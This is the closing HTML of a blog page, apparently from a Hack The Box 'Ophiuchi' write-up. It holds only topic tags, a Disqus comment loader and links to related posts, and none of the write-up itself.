    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Hack The Box</span>
    </a>
  
    
    <a href="/tags/#linux">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Linux</span>
    </a>
  
    
    <a href="/tags/#webassembly">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">WebAssembly</span>
    </a>
  
    
    <a href="/tags/#golang">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">Golang</span>
    </a>
  
    
    <a href="/tags/#java">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">java</span>
    </a>
  
    
    <a href="/tags/#snakeyaml">
    
      <span class="icon">
        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
    <path d="M0 0h24v24H0z" fill="none"/>
    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
</svg>
      </span>&nbsp;<span class="tag-name">SnakeYAML</span>
    </a>
  
</div>
  </div>

  
  <section class="comments">
    <h2>Comments</h2>
    
  <div id="disqus_thread">
    <button class="disqus-load" onClick="loadDisqusComments()">
      Load Comments
    </button>
  </div>
  <script>

  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
  *  https://disqus.com/admin/universalcode/#configuration-variables
  */
  var disqus_config = function () {
      this.page.url = "http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-craft-ophiuchi/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
  }
  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = '//https-ryankozak-com.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
  }
  </script>
  <noscript>
    Please enable JavaScript to view the
    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
  </noscript>



  </section>

  <section class="related">
  <h2>Related Posts</h2>
  <ul class="posts-list">
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro-again/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root...Again
            <small>28 Jun 2021</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
            <small>15 Dec 2020</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box-craft-traceback/">
            Hack The Box - Traceback
            <small>17 Aug 2020</small>
          </a>
        </h3>
      </li>
    
  </ul>
</section>

</div>

    </main>

    
  </body>
</html>
